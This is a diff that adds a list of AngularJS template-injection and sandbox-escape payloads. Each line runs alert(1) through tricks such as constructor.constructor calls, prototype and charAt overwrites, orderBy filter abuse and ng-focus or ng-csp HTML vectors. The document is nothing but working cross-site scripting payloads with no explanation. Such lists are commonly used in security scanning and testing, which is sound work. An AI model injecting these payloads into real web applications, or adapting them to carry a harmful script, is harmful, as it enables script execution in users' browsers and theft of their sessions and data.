@@ -1,0 +1,29 @@
+{{constructor.constructor('alert(1)')()}}
+{{$on.constructor('alert(1)')()}}
+{{a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(1)')()}}
+{{{}.\")));alert(1)\/\/\"}}
+{{(_=''.sub).call.call({}[$='constructor'].getOwnPropertyDescriptor(_.__proto__,$).value,0,'alert(1)')()}}
+{{toString.constructor.prototype.toString=toString.constructor.prototype.call;[\"a\\"alert(1)\"].sort(toString.constructor);}}
+{{{}.\")));alert(1)\/\/\"}}
+{{{}.\")));alert(1)\/\/\"}}
+{{!ready && (ready = true) && (\n!call\n? $$watchers[0].get(toString.constructor.prototype)\n: (a = apply) &&\n(apply = constructor) &&\n(valueOf = call) &&\n(''+''.toString(\n'F = Function.prototype;' +\n'F.apply = F.a;' +\n'delete F.a;' +\n'delete F.valueOf;' +\n'alert(1);'\n)));}}
+{{{}[{toString:[].join,length:1,0:'__proto__'}].assign=[].join;'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)\/\/');}}
+{{'a'[{toString:false,valueOf:[].join,length:1,0:'__proto__'}].charAt=[].join;$eval('x=alert(1)\/\/');}}
+{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)');}}
+{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)\/\/');}}
+{{x={'y':''.constructor.prototype};x['y'].charAt=[].join;$eval('x=alert(1)');}}
+{{\nc=''.sub.call;b=''.sub.bind;a=''.sub.apply;\nc.$apply=$apply;c.$eval=b;op=$root.$$phase;\n$root.$$phase=null;od=$root.$digest;$root.$digest=({}).toString;\nC=c.$apply(c);$root.$$phase=op;$root.$digest=od;\nB=C(b,c,b);$evalAsync(\"\nastNode=pop();astNode.type='UnaryExpression';\nastNode.operator='(window.X?void0:(window.X=true,alert(1)))+';\nastNode.argument={type:'Identifier',name:'foo'};\n\");\nm1=B($$asyncQueue.pop().expression,null,$root);\nm2=B(C,null,m1);[].push.apply=m2;a=''.sub;\n$eval('a(b.c)');[].push.apply=a;\n}}
+{{constructor.constructor('alert(1)')()}}
+{{$on.constructor('alert(1)')()}}
+constructor.constructor('alert(1)')()
+a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(1)')()
+toString.constructor.prototype.toString=toString.constructor.prototype.call;[\"a\\"alert(1)\"].sort(toString.constructor)
+{}[['__proto__']]['x']=constructor.getOwnPropertyDescriptor;g={}[['__proto__']]['x'];{}[['__proto__']]['y']=g(''.sub[['__proto__']],'constructor');{}[['__proto__']]['z']=constructor.defineProperty;d={}[['__proto__']]['z'];d(''.sub[['__proto__']],'constructor',{value:false});{}[['__proto__']]['y'].value('alert(1)')()
+{}.\")));alert(1)\/\/\";
+'a'.constructor.prototype.charAt=[].join;[1]|orderBy:'x=1} } };alert(1)\/\/';
+constructor.constructor('alert(1)')()
+toString().constructor.prototype.charAt=[].join; [1,2]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)
+<input autofocus ng-focus=\"$event.path|orderBy:'[].constructor.from([1],alert)'\">
+<input id=x ng-focus=$event.path|orderBy:'(z=alert)(1)'>
+<input autofocus ng-focus=\"$event.composedPath()|orderBy:'[].constructor.from([1],alert)'\">
+<div ng-app ng-csp><div ng-focus=\"x=$event;\" id=f tabindex=0>foo<\/div><div ng-repeat=\"(key, value) in x.view\"><div ng-if=\"key == 'window'\">{{ [1].reduce(value.alert, 1); }}<\/div><\/div><\/div>
